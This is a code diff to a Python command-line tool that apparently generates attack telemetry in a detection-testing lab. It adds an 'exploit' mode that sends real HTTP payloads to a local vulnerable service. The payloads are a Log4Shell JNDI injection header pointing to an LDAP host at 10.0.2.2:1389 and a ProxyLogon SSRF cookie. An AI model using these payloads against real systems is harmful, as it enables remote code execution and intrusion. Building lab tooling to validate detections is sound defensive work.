@@ -1883,6 +1883,89 @@ def navigator(detections: str, output: str, name: str, description: str) -> None
     )
 
 
+def _run_exploit_direct(cve_id: str, vuln_port: str) -> None:
+    """
+    Send a real HTTP exploit payload to the vulnerable service.
+    The service spawns actual OS processes, generating genuine auditd events.
+    No /simulate endpoint is used — telemetry comes purely from kernel events.
+    """
+    import time as _time
+    import urllib.request
+
+    base_url = f"http://localhost:{vuln_port}"
+
+    # Verify the vulnerable service is up
+    try:
+        urllib.request.urlopen(f"{base_url}/health", timeout=3)
+    except Exception:
+        err_console.print(f"[red]✗ Vulnerable service not reachable at {base_url}[/]")
+        err_console.print("  Run:  vagrant provision  to deploy it.")
+        raise SystemExit(1)
+
+    _EXPLOITS: dict[str, list[dict]] = {
+        "CVE-2021-44228": [
+            {
+                "description": "Log4Shell JNDI injection via X-Api-Version header",
+                "technique": "T1190 + T1059.004",
+                "method": "POST",
+                "path": "/api/log",
+                "headers": {
+                    "Content-Type": "application/json",
+                    # Real JNDI payload — the service makes a real curl to this URL
+                    "X-Api-Version": "${jndi:ldap://10.0.2.2:1389/exploit}",
+                },
+                "body": b'{"msg": "user login"}',
+            },
+        ],
+        "CVE-2021-26855": [
+            {
+                "description": "ProxyLogon Exchange SSRF via malicious X-BEResource cookie",
+                "technique": "T1190 + T1552.001 + T1078",
+                "method": "POST",
+                "path": "/ecp/DDI/DDIService.svc/GetObject",
+                "headers": {
+                    "Content-Type": "application/json",
+                    # Real ProxyLogon SSRF cookie pattern
+                    "Cookie": "X-BEResource=a]@victim:444/EWS/Exchange.asmx?~3;",
+                },
+                "body": b"{}",
+            },
+        ],
+    }
+
+    exploits = _EXPLOITS.get(cve_id.upper(), [])
+    if not exploits:
+        err_console.print(f"[red]No exploit defined for {cve_id} in exploit mode.[/]")
+        err_console.print(f"Available: {', '.join(_EXPLOITS)}")
+        raise SystemExit(1)
+
+    console.print(f"[bold cyan]  Mode: exploit[/] — sending real HTTP payloads to {base_url}\n")
+    total = 0
+    for exp in exploits:
+        console.print(f"  [dim]{exp['description']}[/]")
+        req = urllib.request.Request(
+            f"{base_url}{exp['path']}",
+            data=exp.get("body", b""),
+            headers=exp.get("headers", {}),
+            method=exp["method"],
+        )
+        try:
+            with urllib.request.urlopen(req, timeout=10) as resp:
+                result = json.loads(resp.read())
+            console.print(f"  [green]✓[/] [bold]{exp['technique']}[/]  status={result.get('status','?')}")
+            if result.get("rce"):
+                console.print(f"    [dim]{result['rce'][:80]}[/]")
+            if result.get("identity"):
+                console.print(f"    [dim]{result['identity'][:80]}[/]")
+            total += 1
+        except Exception as exc:
+            err_console.print(f"  [red]✗ exploit failed: {exc}[/]")
+        _time.sleep(1)
+
+    console.print(f"\n[bold green]✓ {total} exploit(s) delivered.[/]")
+    console.print("[dim]Real auditd events generated — allow 3–5s for Vector to flush.[/]")
+
+
 def _run_attack_direct(scenario_path: Path, agent_port: str, delay: float) -> None:
     """Run an attack scenario by calling the victim agent directly (vagrant mode)."""
     import time as _time
@@ -2012,6 +2095,16 @@ def _run_attack_direct(scenario_path: Path, agent_port: str, delay: float) -> No
               type=click.Choice(["docker", "vagrant"]),
               show_default=True,
               help="Attack target: docker (run atomic-runner container) or vagrant (call agent directly).")
+@click.option("--mode", default="simulate",
+              type=click.Choice(["simulate", "exploit"]),
+              show_default=True,
+              help=(
+                  "simulate: POST synthetic events to /simulate (original behaviour). "
+                  "exploit: send a real HTTP exploit payload to the vulnerable service "
+                  "on port 8888 — generates genuine auditd kernel events."
+              ))
+@click.option("--vuln-port", default="8888", show_default=True,
+              help="Port of the vulnerable service (exploit mode only).")
 @click.option("--watch", is_flag=True, default=False,
               help="After the run, show the attack events that landed in OpenSearch.")
 @click.option("--delay", default=1.5, show_default=True,
@@ -2022,6 +2115,8 @@ def attack(
     victim: str,
     agent_port: str,
     target: str,
+    mode: str,
+    vuln_port: str,
     watch: bool,
     delay: float,
 ) -> None:
@@ -2030,11 +2125,14 @@ def attack(
     Use --target docker (default) to run via the atomic-runner container,
     or --target vagrant to call the Vagrant VM agent directly from Python.
 
+    Use --mode exploit to send a real HTTP exploit payload to the vulnerable
+    service (requires vagrant provision to have deployed vulnerable-service.py).
+
     \b
     Examples:
       dv attack --cve CVE-2021-44228
-      dv attack --cve CVE-2021-34527 --watch
-      dv attack --cve CVE-2021-44228 --target vagrant
+      dv attack --cve CVE-2021-44228 --target vagrant --mode exploit
+      dv attack --cve CVE-2021-26855 --target vagrant --mode exploit --watch
       dv attack --scenario docker/atomic-runner/scenarios/proxylogon-cve-2021-26855.yml
     """
     import subprocess
@@ -2082,7 +2180,9 @@ def attack(
     console.print(f"   Victim: [yellow]{victim}[/]  agent: {agent_url}\n")
 
     # ── vagrant mode: call agent directly from Python ────────────────────────
-    if target == "vagrant":
+    if target == "vagrant" and mode == "exploit":
+        _run_exploit_direct(cve_id or "", vuln_port)
+    elif target == "vagrant":
         _run_attack_direct(local_scenario, agent_port, delay)
         # skip the Docker runner section below
     else:
